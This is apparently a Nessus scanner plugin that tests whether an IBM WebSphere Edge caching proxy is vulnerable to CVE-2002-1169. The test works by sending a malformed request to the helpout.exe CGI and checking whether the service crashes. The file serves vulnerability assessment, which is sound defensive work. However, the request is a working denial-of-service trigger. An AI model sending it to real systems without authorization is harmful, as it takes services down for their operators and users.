#
# (C) Tenable Network Security, Inc.
#

########################
# References:
########################
# From:"Rapid 7 Security Advisories" <advisory@rapid7.com>
# Message-ID: <OF0A5563E4.CA3D8582-ON85256C5B.0068EEBC-88256C5B.0068BF86@hq.rapid7.com>
# Date: Wed, 23 Oct 2002 12:08:39 -0700
# Subject: R7-0007: IBM WebSphere Edge Server Caching Proxy Denial of Service
#
########################

include("compat.inc");

if (description)
{
  script_id(11162);
  script_version("$Revision: 1.27 $");
  script_cvs_date("$Date: 2016/11/29 20:13:38 $");

  script_cve_id("CVE-2002-1169");
  script_bugtraq_id(6002);
  script_osvdb_id(2090);

  script_name(english:"IBM WebSphere Edge Caching Proxy DoS");
  script_summary(english:"Crashes the remote proxy");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:
"We could crash the WebSphere Edge caching proxy by sending a bad
request to the helpout.exe CGI."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Upgrade to Caching Proxy efix build 4.0.1.26 or later."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(
    attribute:'see_also',
    value:'http://www.packetstormsecurity.org/advisories/misc/R7-0008.txt'
  );

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/10/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/11/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2002/10/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:websphere_edge_server_caching_proxy");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");

  script_dependencie("httpver.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(0);

banner = get_http_banner(port:port);
if (! banner || "WebSphere" >!< banner ) exit(0);

http_disable_keep_alive();

foreach dir (cgi_dirs())
{
 p = string(dir, "/helpout.exe");
 req = string("GET ", p, " HTTP\r\n\r\n");
 w = http_send_recv_buf(port: port, data: req);

 if(http_is_dead(port: port))
 {
  security_warning(port);
  exit(0);
 }
}
